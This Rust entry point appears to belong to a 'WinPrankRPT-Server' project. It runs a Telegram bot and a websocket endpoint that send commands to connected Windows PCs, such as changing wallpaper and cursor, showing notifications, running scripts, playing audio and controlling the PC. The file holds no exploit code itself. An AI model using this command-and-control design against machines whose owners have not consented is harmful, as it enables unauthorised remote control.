mod telegram {
    pub(crate) mod commands;
    pub(crate) mod handlers;
    pub mod dialogs {
        pub(crate) mod send_notify_dialog;
        pub(crate) mod change_wallpaper;
        pub(crate) mod change_cursor;
    }
    pub mod callbacks {
        pub(crate) mod utils;
        pub(crate) mod open_client;
        pub(crate) mod dialogs;
        pub(crate) mod notification;
        pub(crate) mod scripts;
        pub(crate) mod audio;
        pub(crate) mod control_pc;

        // one of main callbacks
        pub(crate) mod wallpaper;
        pub(crate) mod cursor;
    }
    pub mod callbacks_router;
    pub mod ui;
}

mod core {
    pub(crate) mod ws;
    pub mod enums {
        pub(crate) mod command_types;
        pub(crate) mod rptresponse;
    }
    pub(crate) mod command;
    pub(crate) mod utils;
}
mod config;
mod app;

use std::fs;
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::{Mutex};
use axum::Router;
use axum::routing::{any, get};
use log::{error, info, LevelFilter};
use teloxide::{dptree, Bot};
use teloxide::dispatching::{HandlerExt, UpdateFilterExt};
use teloxide::dispatching::dialogue::InMemStorage;
use teloxide::dptree::case;
use teloxide::prelude::{Dispatcher, Requester, Update};
use teloxide::utils::command::BotCommands;
use tokio::net::TcpListener;
use crate::app::app::{AppState};

// In crate
use crate::config::config::Config;
use crate::core::ws::websockets::handler;
use crate::telegram::callbacks::cursor::change_cursor_callbacks;
use crate::telegram::callbacks::notification::notify_editor_callbacks;
use crate::telegram::callbacks::wallpaper::change_wallpaper_callbacks;
use crate::telegram::callbacks_router::router::callbacks::clients_buttons_callback_handler;
use crate::telegram::commands::telegram_commands::Command;
use crate::telegram::dialogs::change_cursor::change_cursor::{wait_for_cursor, ChangeCursorState};
use crate::telegram::dialogs::change_wallpaper::change_wallpaper::{wait_for_wallpaper, ChangeWallpaperState};
use crate::telegram::dialogs::send_notify_dialog::notify_dialog::{notify_editor_body, notify_editor_title, NotificationEditorState};
use crate::telegram::handlers::handlers::answer;

#[macro_use]
pub extern crate rust_i18n;

i18n!("locales");

#[tokio::main]
async fn main() {
    let preview_hello = r#"
#     _       ___       ____                   __
#    | |     / (_)___  / __ \_________ _____  / /__
#    | | /| / / / __ \/ /_/ / ___/ __ `/ __ \/ //_/
#    | |/ |/ / / / / / ____/ /  / /_/ / / / / ,<
#    |__/|__/_/_/ /_/_/   /_/   \__,_/_/ /_/_/|_|
#
#    by broke_off (https://github.com/broke-off/winprank)
"#;

    // Init Logger
    pretty_env_logger::formatted_builder()
        .filter_level(LevelFilter::Info)
        .init();
    info!("{}", preview_hello);

    info!("Starting WinPrankRPT-Server...");
    info!("Current server version: {}", env!("CARGO_PKG_VERSION"));

    // Reading config file
    let filename = "Config.toml";
    let file = fs::read_to_string(filename).expect("Config file not found");
    let config: Config = toml::from_str(&file).expect("TOML parse error");
    info!("Config file was loaded!");

    // Telegram Bot
    let bot = Bot::new(&config.telegram.token);
    bot.set_my_commands(Command::bot_commands()).await.expect("Failed to setup bot");
    let callbacks_handler = Update::filter_callback_query()
        .branch(case![NotificationEditorState::NotifyEditorStart {notification_data, message_id}].endpoint(notify_editor_callbacks))
        .branch(case![ChangeWallpaperState::ChangeWallpaperSend {change_wallpaper}].endpoint(change_wallpaper_callbacks))
        .branch(case![ChangeCursorState::ChangeCursorSend {change_cursor}].endpoint(change_cursor_callbacks))
        .branch(dptree::endpoint(clients_buttons_callback_handler));

    let message_handler = Update::filter_message()
        .branch(case![NotificationEditorState::NotifyEditorTitle {notification_data, message_id}].endpoint(notify_editor_title))
        .branch(case![NotificationEditorState::NotifyEditorText {notification_data, message_id}].endpoint(notify_editor_body))
        .branch(case![ChangeWallpaperState::ChangeWallpaperSend {change_wallpaper}].endpoint(wait_for_wallpaper))
        .branch(case![ChangeCursorState::ChangeCursorSend { change_cursor}].endpoint(wait_for_cursor))
        .filter_command::<Command>().branch(dptree::endpoint(answer));

    let handler = dptree::entry()
        .enter_dialogue::<Update, InMemStorage<NotificationEditorState>, NotificationEditorState>()
        .enter_dialogue::<Update, InMemStorage<ChangeWallpaperState>, ChangeWallpaperState>()
        .enter_dialogue::<Update, InMemStorage<ChangeCursorState>, ChangeCursorState>()
        .branch(message_handler)
        .branch(callbacks_handler);

    rust_i18n::set_locale(&*config.telegram.lang);
    info!("Selected telegram bot language: {}", config.telegram.lang.to_uppercase());
    info!("Telegram bot initialized");

    // Creating App State
    let mut state: AppState = AppState::new(bot.clone(), config.clone());

    state.load_scripts();
    state.load_sounds();

    let shared_state = Arc::new(Mutex::new(state));

    // Creating clones for Axum & TelegramBot
    let bot_state = shared_state.clone();
    let axum_state = shared_state.clone();

    // Axum
    let app = router(axum_state).await;
    let listener = TcpListener::bind(format!("{}:{}", config.server.ip, config.server.port)).await.expect("Could not bind to address");
    info!("Server listening on {}", listener.local_addr().unwrap());

    // dispatcher
    let deps = dptree::deps![bot_state,
        InMemStorage::<NotificationEditorState>::new(), InMemStorage::<ChangeWallpaperState>::new(),
        InMemStorage::<ChangeCursorState>::new()
    ];
    let mut dispatcher = Dispatcher::builder(bot, handler).dependencies(deps).enable_ctrlc_handler().build();

    // Running Telegram Bot and Server
    tokio::select! {
        _ = axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()) => {
            error!("Server error!")
        }
        _ = dispatcher.dispatch() => {
            error!("Telegram bot error");
        }
    }
}

// Router
async fn router(app_state: Arc<Mutex<AppState>>) -> Router {
    Router::new()
        .route("/", get(root))
        .route("/invoke", any(handler))
        .with_state(app_state)
}

async fn root() -> &'static str {
    "WinPrankRPT-Server is working..."
}